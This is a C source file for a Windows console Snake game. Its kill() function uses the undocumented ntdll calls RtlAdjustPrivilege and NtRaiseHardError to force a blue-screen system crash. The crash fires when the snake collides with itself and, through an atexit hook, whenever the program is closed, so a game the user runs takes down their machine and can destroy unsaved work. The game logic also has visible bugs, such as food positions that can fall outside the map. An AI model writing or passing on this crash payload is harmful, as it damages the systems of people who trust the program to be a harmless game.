#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <pthread.h>
#include <time.h>
#include <winternl.h>


typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS (NTAPI *NtRaiseHardErrorFunc)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
                                               ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption,
                                               PULONG Response);

void kill() {
    /*
     * This procedure attempts to raise a hard error (BSOD) using functions from ntdll.dll.
     * It loads the ntdll.dll library, obtains function pointers, adjusts privileges,
     * and raises a hard error.
     */

    // Load ntdll.dll library
    HMODULE ntdll = LoadLibrary("ntdll.dll");
    if (ntdll == NULL) {
        fprintf(stderr, "Error loading ntdll.dll\n");
        return;
    }

    // Obtain function pointers
    RtlAdjustPrivilegeFunc adjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardErrorFunc raiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");

    if (adjustPrivilege == NULL || raiseHardError == NULL) {
        fprintf(stderr, "Error getting function pointers\n");
        FreeLibrary(ntdll);
        return;
    }


    // Adjust privileges and raise a hard error
    BOOLEAN b;
    unsigned long response;
    adjustPrivilege(19, 1, 0, &b);
    raiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

    FreeLibrary(ntdll);
}
#define HEIGHT 16

char map[HEIGHT][HEIGHT + 1];


typedef struct {
    int x, y, length, x_dir, y_dir, alive, score;
    int tail[HEIGHT * HEIGHT][2];
    char direction;
} Snake;
Snake snake;


void init_map(){
    /*
     * Program's start procedure.
     */
    snake.alive = 1;
    for(int i = 0; i < HEIGHT * HEIGHT; i++){
        snake.tail[i][0] = -1;
        snake.tail[i][1] = -1;
    }

    for(int i = 0; i < HEIGHT - 1; i++){
        sprintf(map[i], "               ");
    }

}

void draw_map(){
    /*
     * Draws the map.
     */
    char* format = "%s\n";
    for (int i = 0; i < HEIGHT; i++){
        format = i == HEIGHT - 1 ? "%s":format;
        printf(format, map[i]);
    }
}

void tail_handler(){
    /*
     * Sets all tail blocks.
     */
    for(int i = 0; i < snake.length; i++){
        map[snake.tail[i][1]][snake.tail[i][0]] = '@';
    }

}

void unshift_tail(int x, int y) {
    /*
     * Assuming snake is a global variable or passed as an argument
     */

    for (int i = (HEIGHT * HEIGHT - 2); i >= 2; i -= 2) {
        snake.tail[i][0] = snake.tail[i - 2][0];
        snake.tail[i][1] = snake.tail[i - 2][1];
    }

    // Add new element at the beginning
    snake.tail[0][0] = x;
    snake.tail[0][1] = y;
}

void clear_snake(){
    /*
     * The simplest method to prevent old tails.
     */
    for(int i = 0; i <  HEIGHT; i++){
        for (int j = 0; j < HEIGHT; j++){
            if(map[i][j] == '@') map[i][j] = ' ';
        }
    }
}

void generate_food(){
    /*
     * The procedure that generates food on the map at a random location in the form of '*' and checks if it is not within the snake's body.
     */
    srand(time(NULL));

    int x, y;

    for(;;){

        x = rand() % HEIGHT - 1;
        y = rand() % HEIGHT - 1;

        if(map[y][x] != '@'){
            break;
        }
    }

    map[y][x] = '*';

}

void set_title(){
    char title[256];
    sprintf(title, "%d", snake.score);
    SetConsoleTitle(title);
}
void update_map(int x, int y){
    /*
     * The procedure that updates the coordinates of the snake, its tail, and sets them on the map.
     */
    unshift_tail(snake.x, snake.y);
    snake.x = x;
    snake.y = y;
    clear_snake();
    if(map[y][x] == '*'){

        snake.length+=2;
        snake.score++;
        set_title();
        map[snake.y][snake.x] = '@';
        generate_food();
    } else map[snake.y][snake.x] = '@';

    tail_handler();
}

void check_crossing(){
    /*
     * Snake transitioning from one side of the screen to the other.
     */
    switch(snake.x){
        case 16:
            snake.x = 0;
            break;

        case -1:
            snake.x = 15;
            break;
    }

    switch(snake.y){
        case 16:
            snake.y = 0;
            break;

        case -1:
            snake.y = 15;
            break;
    }
}

void check_collision(int x, int y){
    /*
     * The procedure that triggers the blue screen of death and shuts down the main loop of the program.
     */
    if (map[y][x] == '@'){
        snake.alive = 0;
        kill();
    }
}

void change_direction(int x, int y){
  snake.x_dir = x;
  snake.y_dir = y;

}
void check_direction(){
    /*
     * Checking which key was pressed and indicating the direction.
     */
    switch(snake.direction){
        case 'w':
            if(snake.y_dir == 1){
                snake.direction = 's';
                break;
            }
            change_direction(0, -1);
            break;

        case 's':
            if(snake.y_dir == -1){
                snake.direction = 'w';
                break;
            }

            change_direction(0, 1);
            break;

        case 'a':
            if(snake.x_dir == 1){
                snake.direction = 'd';
                break;
            }
            change_direction(-1, 0);
            break;

        case 'd':
            if(snake.x_dir == -1){
                snake.direction = 'a';
                break;
            }
            change_direction(1, 0);
            break;
    }
}


void* draw_map_thread(){
    /*
     * The procedure that is loaded into the thread as the main loop of the program.
     */
    for(;snake.alive;){

        check_direction();
        check_crossing();
        check_collision(snake.x + snake.x_dir, snake.y + snake.y_dir);
        update_map(snake.x + snake.x_dir, snake.y + snake.y_dir);

        draw_map();
        Sleep(50);
        system("cls");
    }
}

void start(){
    atexit(kill); //Prevention of cunning players

    snake.score = 0;
    set_title();

    snake.length = 3;

    init_map();
    generate_food();

    snake.x = 8;
    snake.y = 8;
    snake.direction = _getch();

    pthread_t pthread;
    pthread_create(&pthread, NULL, draw_map_thread, NULL);

    for(;;){
        snake.direction = _getch();
    }

}
int main(){
    start();
    return 0;
}
